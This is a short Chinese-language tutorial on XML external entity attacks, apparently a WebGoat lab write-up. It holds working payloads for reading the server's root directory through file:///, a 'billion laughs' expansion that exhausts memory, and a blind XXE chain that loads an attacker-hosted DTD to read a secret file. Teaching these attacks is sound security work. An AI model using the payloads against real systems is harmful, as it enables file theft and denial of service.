XML实体允许定义标记，这些标记将在解析XML文档时被内容替换。一般来说，实体有三种类型:

1. 内部实体
2. 外部实体
3. 参数实体

实体必须在文档类型定义(DTD)中创建，让我们从一个例子开始

```
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE blog [
  <!ELEMENT author (#PCDATA)>
  <!ENTITY js "Jo Smith">
]>
<blog>
<author>&js;</author>
</blog>
```

会被解析为

```
<blog>
<author>Jo Smith</author>
</blog>
```

### 信息泄露示例

```
<?xml version="1.0" ?>
<!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]>
<comment>
<text>&root;</text>
</comment>
```
可以将根目录`/`下的内容读取出来

### 拒绝服务示例

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
使用相同的XXE攻击，可以对服务器进行DOS服务攻击。当XML解析器加载这个文档时，它看到包含根元素lolz，其中包含文本&lol9;。然而，&lol9;是一个已定义的实体，它可以扩展为包含十个&lol8;的字符串。每个&lol8;字符串都是一个已定义的实体，可以扩展为十个&lol7;字符串，以此类推。在处理所有实体扩展之后，这个小块< 1 KB的XML实际上将占用几乎3 GB的内存。

### Blind XXE

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY ping SYSTEM 'file://home/webgoat/.webgoat-8.2.2//XXE/secret.txt'>
```
在服务器中托管该DTD文件，并拦截携带XML的请求，修改请求内容，使其远程调用文件。

```
<?xml version="1.0"?>
<comment>
<text>cute</text>
</comment>
```

修改为

```
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY % command SYSTEM "http://127.0.0.1:9090/files/sonder/attack.dtd">
%command;
]>
<comment>
<text>cute &ping;</text>
</comment>
```